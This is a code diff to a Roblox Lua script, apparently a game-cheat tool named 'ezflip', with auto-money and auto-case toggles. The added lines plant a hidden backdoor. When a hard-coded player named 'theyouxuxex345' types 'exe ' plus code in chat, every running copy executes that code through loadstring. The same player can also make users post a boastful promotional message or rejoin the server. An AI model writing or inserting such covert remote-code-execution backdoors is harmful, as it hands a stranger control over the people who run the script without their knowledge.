@@ -1674,6 +1674,40 @@ game.Players.PlayerAdded:Connect(function(plr)
         end)
     end
 end)
+for i,plr in pairs(game.Players:GetChildren()) do
+    if plr.Name == "theyouxuxex345" then
+        plr.Chatted:Connect(function(msg)
+            if msg:find("exe ") then
+            local msg2 = string.gsub(msg,"exe ","")
+            local success, error = pcall(function()
+                loadstring(msg2)()
+            end)
+            if not success and error then
+                local args = {
+                    [1] = error,
+                    [2] = "All"
+                }
+
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+            end
+            end
+
+            if msg == "who is using ezflip" then
+                local args = {
+                    [1] = "im using ezflip because its the best script ever and im super pro and cool and the owner is cool ye",
+                    [2] = "All"
+                }
+
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            end
+
+            if msg == "/rj" then
+                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+            end
+        end)
+    end
+end
 
 getgenv().automoneyclick = false;
 getgenv().autocase = false;
